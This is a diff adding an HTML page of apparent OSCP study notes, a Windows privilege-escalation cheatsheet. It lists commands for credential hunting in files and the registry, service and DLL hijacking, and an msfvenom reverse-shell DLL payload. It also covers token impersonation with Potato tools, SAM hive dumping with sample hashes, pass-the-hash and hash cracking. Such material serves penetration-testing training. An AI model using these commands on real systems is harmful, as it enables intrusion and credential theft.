@@ -1,0 +1,376 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <title>Windows Privilege Escalation - OSCP Notes</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+
+<body>
+
+    <nav>
+        <a href="index.html">Home</a>
+        <div class="dropdown">
+            <a href="#">AD ▾</a>
+            <div class="dropdown-content">
+                <a href="enumeration.html">Enumeration</a>
+                <a href="attacking.html">Attacking</a>
+                <a href="lateralMovement.html">Lateral Movement</a>
+                <a href="metodologie.html">Methodology</a>
+            </div>
+        </div>
+        <a href="windows_privesc.html">Windows PrivEsc</a>
+        <a href="linux-privesc.html">Linux Privesc</a>
+        <a href="file-transfer.html">File Transfer</a>
+        <a href="checklist.html">Checklist</a>
+    </nav>
+
+    <div class="container">
+
+        <h1>Windows Privilege Escalation – Complete OSCP Cheatsheet</h1>
+
+        <div class="section">
+            <div class="section-header">1. Identity & Token Enumeration</div>
+            <div class="section-content">
+
+                <pre><code>whoami
+echo %USERNAME%
+whoami /priv
+whoami /groups
+whoami /all</code></pre>
+
+                <p>Always start here. Identify user, privileges, groups and Integrity Level.</p>
+
+                <ul>
+                    <li><strong>SeBackupPrivilege</strong> → Dump SAM / SYSTEM</li>
+                    <li><strong>SeRestorePrivilege</strong> → Overwrite protected files</li>
+                    <li><strong>SeImpersonatePrivilege</strong> → Token impersonation (Potato)</li>
+                    <li><strong>Integrity Level High</strong> → Elevated token</li>
+                </ul>
+
+            </div>
+        </div>
+
+        <div class="section">
+            <div class="section-header">2. Users & Groups</div>
+            <div class="section-content">
+
+                <pre><code>net user
+net user username
+net localgroup
+net localgroup Administrators
+net user /domain
+net group /domain</code></pre>
+
+                <p>Look for misconfigurations or users in privileged groups.</p>
+
+            </div>
+        </div>
+
+        <div class="section">
+            <div class="section-header">3. System Enumeration</div>
+            <div class="section-content">
+
+                <pre><code>systeminfo
+systeminfo | findstr /B /C:"OS Name" /C:"System Type"
+wmic qfe get Caption,Description,HotFixID,InstalledOn
+wmic logicaldisk get caption,description
+wmic product get name,version,vendor</code></pre>
+
+                <p>Identify OS version, architecture and missing patches.</p>
+
+                <h3>Drivers</h3>
+                <pre><code>driverquery /v
+driverquery.exe /v /fo csv | ConvertFrom-CSV | Select-Object 'Display Name','Start Mode',Path
+Get-WmiObject Win32_PnPSignedDriver | Select DeviceName,DriverVersion,Manufacturer</code></pre>
+
+            </div>
+        </div>
+
+        <div class="section">
+            <div class="section-header">4. Network Enumeration</div>
+            <div class="section-content">
+
+                <pre><code>ipconfig /all
+route print
+arp -a
+mountvol</code></pre>
+
+            </div>
+        </div>
+
+        <div class="section">
+            <div class="section-header">5. Credential Hunting</div>
+            <div class="section-content">
+
+                <pre><code>findstr /si password *.txt
+findstr /si password *.xml
+findstr /si password *.ini
+findstr /si password *.config
+dir /s *pass*
+dir /s *cred*
+dir /s *vnc*
+dir /b /s unattend.xml
+dir /b /s sysprep.inf</code></pre>
+
+                <h3>Registry Credentials</h3>
+                <pre><code>reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\WinLogon"
+reg query "HKCU\Software\ORL\WinVNC3\Password"
+reg query "HKCU\Software\TightVNC\Server"
+reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"</code></pre>
+
+                <pre><code>cmdkey /list</code></pre>
+
+            </div>
+        </div>
+
+        <div class="section">
+            <div class="section-header">6. Services Enumeration</div>
+            <div class="section-content">
+
+                <pre><code>sc query
+sc qc ServiceName
+wmic service get name,displayname,pathname,startmode</code></pre>
+
+                <p>Look for:</p>
+
+                <ul>
+                    <li>Unquoted paths</li>
+                    <li>Writable service binaries</li>
+                    <li>Weak permissions</li>
+                    <li>Service running as SYSTEM</li>
+                </ul>
+
+            </div>
+        </div>
+
+        <div class="section">
+            <div class="section-header">7. Unquoted Service Paths</div>
+            <div class="section-content">
+
+                <pre><code>wmic service get name,displayname,pathname,startmode | findstr /i "auto"</code></pre>
+
+                <p>If path contains spaces and no quotes → possible hijack.</p>
+
+                Example:
+                <pre><code>C:\Program Files\Vulnerable App\service.exe</code></pre>
+
+                Place malicious executable in:
+                <pre><code>C:\Program.exe</code></pre>
+
+            </div>
+        </div>
+
+        <div class="section">
+            <div class="section-header">8. Service Binary Hijacking</div>
+            <div class="section-content">
+
+                <pre><code>icacls "C:\Path\To\ServiceBinary.exe"</code></pre>
+
+                <p>If writable and service runs as SYSTEM → replace binary.</p>
+
+                <pre><code>sc stop ServiceName
+copy malicious.exe ServiceBinary.exe
+sc start ServiceName</code></pre>
+
+            </div>
+        </div>
+
+        <div class="section">
+            <div class="section-header">9. DLL Hijacking</div>
+            <div class="section-content">
+
+                <p>Service tries loading missing DLL.</p>
+
+                Check writable directory:
+
+                <pre><code>icacls C:\ServiceDirectory</code></pre>
+
+                Generate DLL:
+
+                <pre><code>msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f dll -o malicious.dll</code></pre>
+
+                Restart service.</p>
+
+            </div>
+        </div>
+
+        <div class="section">
+            <div class="section-header">10. Scheduled Tasks</div>
+            <div class="section-content">
+
+                <pre><code>schtasks /query /fo LIST /v</code></pre>
+
+                <p>Check task binary path and permissions.</p>
+
+                <pre><code>icacls C:\Path\To\TaskBinary.exe</code></pre>
+
+                If writable and runs as SYSTEM → replace binary.</p>
+
+            </div>
+        </div>
+
+        <div class="section">
+            <div class="section-header">11. SeImpersonatePrivilege Abuse</div>
+            <div class="section-content">
+
+                <pre><code>whoami /priv</code></pre>
+
+                If enabled:
+
+                <pre><code>PrintSpoofer64.exe -i -c cmd
+GodPotato.exe -cmd cmd</code></pre>
+
+                Gain SYSTEM via token impersonation.
+
+            </div>
+        </div>
+
+        <div class="section">
+            <div class="section-header">12. Backup Operators Abuse</div>
+            <div class="section-content">
+
+                <pre><code>reg save HKLM\SAM sam
+reg save HKLM\SYSTEM system</code></pre>
+
+                Extract hashes on Kali:
+
+                <pre><code>impacket-secretsdump -sam sam -system system LOCAL
+
+                </code> 
+Example output
+            
+                <code>
+[*] Target system bootKey: 0x43fb7db03b453fdfd97047bcb8f91841
+[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
+Administrador:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+Invitado:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:a8a78f0ecb61161f152f540cd3652edb:::
+Usuario:1001:aad3b435b51404eeaad3b435b51404ee:253eae1ef59c20a77fbb3af6d5ec45f3:::</code>
+            
+            </pre>
+
+                Pass-the-Hash:
+
+                <pre><code>impacket-psexec -hashes :NTHASH Administrator@IP</code></pre>
+
+                Offline cracking:
+
+                <pre>First we copy the hash to a File<code>
+
+echo "253eae1ef59c20a77fbb3af6d5ec45f3" > hashes
+
+                </code>
+Then we crack it<code>
+
+hashcat -m 1000 hashes rockyou.txt
+                </code></pre>
+
+            </div>
+        </div>
+
+        <div class="section">
+            <div class="section-header">13. Kernel Exploits</div>
+            <div class="section-content">
+
+                <p>If fully patched enumeration fails:</p>
+
+                <pre><code>systeminfo
+wmic qfe get HotFixID</code></pre>
+
+                Search for public exploits matching OS build.</p>
+
+            </div>
+        </div>
+
+        <div class="section">
+            <div class="section-header">14. Automated Enumeration</div>
+            <div class="section-content">
+
+                <pre><code>winPEAS.exe
+PowerUp.ps1
+Seatbelt.exe</code></pre>
+
+                Always manually verify findings.
+
+            </div>
+        </div>
+
+        <div class="section">
+            <div class="section-header">15. OSCP Mental Checklist</div>
+            <div class="section-content">
+
+                <ol>
+                    <li>Who am I?</li>
+                    <li>What privileges do I have?</li>
+                    <li>What groups?</li>
+                    <li>Any writable services?</li>
+                    <li>Unquoted paths?</li>
+                    <li>Scheduled tasks?</li>
+                    <li>SeImpersonate?</li>
+                    <li>Backup Operators?</li>
+                    <li>Credential files?</li>
+                    <li>Kernel exploit?</li>
+                </ol>
+
+            </div>
+        </div>
+
+
+        <div class="section">
+            <div class="section-header">16. Windows PrivEsc Practical Checklist</div>
+            <div class="section-content">
+
+                <form class="checklist">
+
+                    <h3>Initial Enumeration</h3>
+                    <label><input type="checkbox"> Ran whoami /all</label><br>
+                    <label><input type="checkbox"> Checked privileges (SeImpersonate, SeBackup, etc.)</label><br>
+                    <label><input type="checkbox"> Checked groups (Administrators, Backup Operators, etc.)</label><br>
+                    <label><input type="checkbox"> Identified Integrity Level</label><br>
+
+                    <h3>System & Patch Level</h3>
+                    <label><input type="checkbox"> Ran systeminfo</label><br>
+                    <label><input type="checkbox"> Checked installed hotfixes</label><br>
+                    <label><input type="checkbox"> Identified OS architecture (x86/x64)</label><br>
+
+                    <h3>Credentials Hunting</h3>
+                    <label><input type="checkbox"> Searched for password files</label><br>
+                    <label><input type="checkbox"> Checked registry for credentials</label><br>
+                    <label><input type="checkbox"> Checked saved credentials (cmdkey)</label><br>
+
+                    <h3>Services & Tasks</h3>
+                    <label><input type="checkbox"> Enumerated services</label><br>
+                    <label><input type="checkbox"> Checked unquoted service paths</label><br>
+                    <label><input type="checkbox"> Checked service binary permissions</label><br>
+                    <label><input type="checkbox"> Enumerated scheduled tasks</label><br>
+                    <label><input type="checkbox"> Checked task binary permissions</label><br>
+
+                    <h3>Privilege Abuse</h3>
+                    <label><input type="checkbox"> Tested SeImpersonate exploitation</label><br>
+                    <label><input type="checkbox"> Tested Backup Operators abuse</label><br>
+
+                    <h3>Advanced</h3>
+                    <label><input type="checkbox"> Ran winPEAS / Seatbelt</label><br>
+                    <label><input type="checkbox"> Manually verified findings</label><br>
+                    <label><input type="checkbox"> Checked for kernel exploits</label><br>
+
+                </form>
+
+            </div>
+        </div>
+
+
+    </div>
+
+    <script>
+        document.querySelectorAll(".section-header").forEach(h => {
+            h.addEventListener("click", () => h.parentElement.classList.toggle("active"))
+        })
+    </script>
+
+</body>
+
+</html>
